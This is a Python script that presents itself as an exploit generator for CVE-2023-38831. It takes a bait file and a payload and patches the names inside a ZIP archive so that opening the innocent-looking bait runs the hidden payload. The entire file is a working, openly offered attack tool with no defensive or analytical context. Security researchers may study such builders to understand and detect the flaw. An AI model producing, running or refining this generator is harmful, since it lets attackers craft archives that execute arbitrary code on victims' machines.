
import argparse
import string
import random
import os
import shutil
import tempfile

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='Exploit generator for CVE-2023-38831')
    parser.add_argument('bait', help='Path to the bait file to to add to the archive.')
    parser.add_argument('switch', help='Path to the payload to switcheroo with the bait file on double click.')
    parser.add_argument('output', help='Path to the output file.')
    parser.add_argument('-v', '--verbose', help='Verbose output.', action='store_true')
    parser.add_argument('-i', '--ignore-path-check', help="Ignore path validity check.\n" + 
                        "If given, rarce can overwrite existing files given in output parameter, and can create missing folders for output path.", action="store_true")
    parser.add_argument('-dt', '--dont-use-tempdir', help="Prevent the tool from creating a temporary directory when creating the exploit.\n" + 
                        "Instead, create the intermediate folders in current working directory.", action="store_true")
    parser.add_argument("-pt", "--preserve-temp", help="Preserve the temporary directory after creating the exploit. Has no effect if -dt or --dont-use-tempdir is not specified.")
    return  parser.parse_args()

def verbose_log(*args, **kwargs) -> None:
    print(*args, **kwargs)

def check_path_validity(bait, switch, output, ignore_path_check=False) -> bool:
    verbose_log(f"Checking bait validity: {bait}")
    if not os.path.isfile(bait):
        print(f"Incorrect bait file. Make sure the file exist at given path.")
        return False
    if not os.path.isfile(switch):
        print(f"Incorrect switch file. Make sure the file exist at given path.")
        return False
    if os.path.isfile(output):
        if not ignore_path_check:
            print(f"Output file already exist. Please remove it or choose another path.")
            print(f"Optionally, specify the -i or --ignore-path-check flag to allow overwriting the output file.")
            return False
        else:
            verbose_log(f"Output file already exist, but --ignore-path-check flag is provided.")
    output_folder = os.path.dirname(output)
    if(output_folder and not os.path.isdir(output_folder)):
        if not ignore_path_check:
            print(f"Output folder does not exist. Please create it or choose another path.")
            print(f"Optionally, specify the -i or --ignore-path-check flag to allow creating the output folder.")
            return False
        else:
            verbose_log(f"Output folder does not exist, but --ignore-path-check flag is provided. Creating given path.")
            os.makedirs(output_folder, exist_ok=True)
    return True

def main():
    global verbose_log

    args = parse_args()

    # disable log function if verbosity is not set
    if not args.verbose:
        verbose_log = lambda *a, **kw: None

    if(not check_path_validity(args.bait, args.switch, args.output, args.ignore_path_check)):
        return
    
    if args.dont_use_tempdir:
        temp_dir = ''.join(random.choice(string.ascii_letters) for i in range(12))
        os.makedirs(temp_dir, exist_ok=True)
    else:
        temp_dir = tempfile.mkdtemp()
    verbose_log(f"Working on temporary directory: {temp_dir}")
    base_bait_name = os.path.basename(args.bait)
    original_switch_extension = args.switch.split(".")[-1]
    bait_len = len(base_bait_name) + 1
    final_switch_len = bait_len + len(original_switch_extension) + 1
    bait_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(bait_len))
    switcheroo_path_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(bait_len))
    switch_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(final_switch_len))
    

    switcheroo_path  = os.path.join(temp_dir, switcheroo_path_placeholder)
    os.mkdir(os.path.join(temp_dir, switcheroo_path_placeholder))
    verbose_log(f"Using placeholders for bait and switch. Bait:{bait_placeholder}, Switch:{switch_placeholder}, Switch path:{switcheroo_path_placeholder}")
    verbose_log(f"Copying bait to {os.path.join(temp_dir, bait_placeholder)}")
    shutil.copyfile(args.bait, os.path.join(temp_dir, bait_placeholder))
    verbose_log(f"Copying switch to {os.path.join(temp_dir, switcheroo_path_placeholder, switch_placeholder)}")
    shutil.copyfile(args.switch, os.path.join(temp_dir, switcheroo_path_placeholder, switch_placeholder))

    verbose_log(f"Creating switcheroo file at {switcheroo_path}")
    shutil.make_archive(temp_dir, 'zip', temp_dir)

    with open(f"{temp_dir}.zip", "rb") as temp_zip:
        zip_contents = temp_zip.read()
        
        zip_contents = zip_contents.replace(bait_placeholder.encode(), base_bait_name.encode() + b" ")
        zip_contents = zip_contents.replace(switch_placeholder.encode(), base_bait_name.encode() + b" ." + original_switch_extension.encode())
        zip_contents = zip_contents.replace(switcheroo_path_placeholder.encode(), base_bait_name.encode() + b" ")
        with open(args.output, "wb") as output:
            output.write(zip_contents)

    if(args.dont_use_tempdir and not args.preserve_temp):
        shutil.rmtree(temp_dir)
    os.remove(f"{temp_dir}.zip")
    print(f"Done! Output written to {args.output}")

if __name__ == '__main__':
    main()